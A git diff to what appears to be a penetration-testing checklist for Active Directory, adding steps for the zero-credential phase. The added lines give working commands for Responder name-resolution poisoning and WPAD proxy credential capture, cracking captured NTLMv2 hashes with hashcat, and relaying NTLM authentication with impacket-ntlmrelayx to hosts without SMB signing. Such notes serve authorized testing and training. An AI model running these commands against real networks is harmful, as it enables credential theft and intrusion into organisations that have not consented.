@@ -5,6 +5,12 @@ Reference: [AD Enumeration](../1-information-gathering/06-active-directory-enume
 
 ## Zero-cred enum (do all of these first)
 
+- [ ] **Start Responder in a dedicated tmux pane the moment you land internal** — this is the highest-ROI passive attack in AD, run it while everything else happens:
+  - Analyze-only first (no poisoning, just listen): `sudo responder -I tun0 -A`.
+  - Full poisoning: `sudo responder -I tun0 -wF` (`-w` WPAD, `-F` force NTLM auth).
+  - Captured hashes land at `/usr/share/responder/logs/*NTLMv2*.txt` — crack with `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`.
+  - If SMB signing is off on any host, pivot to relaying instead of cracking: turn off Responder's SMB/HTTP servers (`/etc/responder/Responder.conf` → `SMB=Off`, `HTTP=Off`) and run `impacket-ntlmrelayx -tf smb_signing_off.txt -smb2support -socks` in parallel.
+  - `sudo responder -I tun0 -P -v` (`-P` proxy auth capture) also grabs WPAD proxy creds if the client uses PAC files.
 - [ ] Confirm DC + domain name: `nxc smb <dc-ip>`.
 - [ ] Add to `/etc/hosts`: `<dc-ip> dc01.domain.local domain.local`.
 - [ ] SMB null session: `nxc smb <dc-ip> -u '' -p '' --shares --users --groups --pass-pol`.
